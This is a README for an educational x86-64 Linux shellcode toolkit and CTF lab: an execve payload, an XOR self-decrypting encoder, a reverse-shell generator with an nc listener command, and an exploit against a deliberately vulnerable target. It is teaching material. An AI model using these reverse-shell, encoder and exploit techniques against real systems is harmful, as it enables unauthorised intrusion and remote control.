# Shellcode Development

A complete, working **x86-64 Linux** shellcode toolkit for security research and
CTF training: real payloads, a null-free self-decrypting encoder, a deliberately
vulnerable target with a working exploit, and an isolated Docker lab.

> ⚠️ **Educational use only.** Extracted shellcode performs real syscalls and
> the bundled `bin/vuln` is intentionally exploitable. Run everything inside the
> Docker lab or a disposable VM — never on a host you depend on.

## Features

| Component | What it does |
|---|---|
| `src/shellcode/execve.asm` | `execve("/bin/sh", NULL, NULL)` — 28 B, null-free, PIC |
| `src/shellcode/readflag.asm` | `open/read/write` — dumps `flag.txt` to stdout, null-free |
| `src/scripts/encoder.py` | Single-byte XOR encoder + **null-free self-decrypting decoder** stub |
| `src/scripts/gen_reverse_shell.py` | Generates null-free connect-back shellcode (IP/port) |
| `src/scripts/exploit.py` | pwntools exploit of `bin/vuln`: offset self-calibration + `jmp rsp` |
| `src/target/vuln.c` | Deliberately vulnerable target (stack overflow, execstack, no-PIE) |
| `tests/test_shellcode.py` | Unit + integration + e2e (execve, decoder, readflag, reverse shell, exploit) |

## Quick start (in the Docker lab)

```bash
docker compose run --rm lab bash      # enter the lab
# inside the container:
make all extract vuln                 # build shellcode, raw bytes, vuln target
make test                             # full pytest suite
make check                            # lint + coverage (fails below 80%)
od -An -tx1 bin/execve.bin            # inspect the raw bytes
```

### Work with each component

```bash
# Encode a payload (null-free), or build a self-decrypting one:
python3 src/scripts/encoder.py bin/execve.bin            # XOR-encoded, C-array
python3 src/scripts/encoder.py bin/execve.bin --decode   # decoder + encoded
python3 src/scripts/encoder.py bin/execve.bin --decode -o bin/execve.enc

# Generate a reverse shell for your listener:
python3 src/scripts/gen_reverse_shell.py 127.0.0.1 4444 -o bin/reverse_shell.bin
nc -lvp 4444        # in another terminal, then run the payload

# Exploit the vulnerable target locally:
make vuln
python3 src/scripts/exploit.py                 # EXPLOIT_MODE=local (default)
```

## Run the vulnerable service over TCP

```bash
docker compose up -d target                                  # serves bin/vuln on :1337
docker compose run --rm -e EXPLOIT_MODE=remote \
    -e TARGET_HOST=target -e TARGET_PORT=1337 lab \
    python3 src/scripts/exploit.py
```

## Verification

All payloads are validated end-to-end inside the lab — not just assembled:
`run_shellcode` executes each payload and asserts a shell spawns, the decoder
self-decrypts, `flag.txt` is dumped, a reverse shell connects back, and the
overflow exploit against `bin/vuln` yields an interactive shell.

## Troubleshooting

- **`decoder stub has null bytes`** (encoder) — the null-free decoder uses
  `push imm8`, so the payload must be < 128 bytes. Shorten the payload.
- **`could not find buffer address`** (exploit) — `vuln` must keep a frame
  pointer; the Makefile passes `-fno-omit-frame-pointer`. Rebuild with `make vuln`.
- **Remote exploit returns garbage / syntax errors** — `bin/vuln` is hosted via
  `socat ... pty,raw,echo=0`. Over a pty, keep commands simple (avoid `$((...))`
  arithmetic); use plain commands like `id`, `ls`, `echo X`.
- **`run_shellcode` / `process` fail to spawn** — run the container with
  `--cap-add=SYS_PTRACE --security-opt seccomp=unconfined` (the compose `lab`
  service already sets these).
- **Payload segfaults on a target** — confirm the target has an executable stack
  (`vuln` uses `-z execstack`). Hardened targets need mmap-RWX or a ROP strategy.
- **`nasm: command not found`** — install the toolchain (`apt-get install nasm
  build-essential`) or just use the Docker lab.
